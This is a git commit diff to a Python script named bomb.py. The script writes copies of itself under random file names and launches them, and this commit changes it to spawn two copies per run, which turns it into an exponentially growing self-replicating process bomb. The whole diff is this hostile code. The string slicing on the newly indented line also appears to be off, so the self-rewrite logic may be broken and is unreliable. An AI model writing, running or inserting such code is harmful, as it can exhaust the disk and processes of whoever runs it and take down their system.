7ae8ae3d74ee9a7190e0fe96fc34ba9ed611df78
ayylamo <ayylamo@cock.li>
2017-03-04 00:08:55 -0600

    updated logic

--- bomb.py
+++ bomb.py
@@ -1,7 +1,8 @@
 from random import randrange
 from subprocess import Popen
-name = "a%010d.py"%randrange(0,100000000000)
-l = open('bomb.py','r').read().split('\n')
-l[3] = l[3][:10]+name[:-3]+l[3][l[3].index('.py'):]
-open(name,'w').write('\n'.join(l))
-Popen(['python',name])
+for i in range(2):
+    name = "a%010d.py"%randrange(0,100000000000)
+    l = open('bomb.py','r').read().split('\n')
+    l[4] = l[4][:10]+name[:-3]+l[4][l[4].index('.py'):]
+    open(name,'w').write('\n'.join(l))
+    Popen(['python',name])
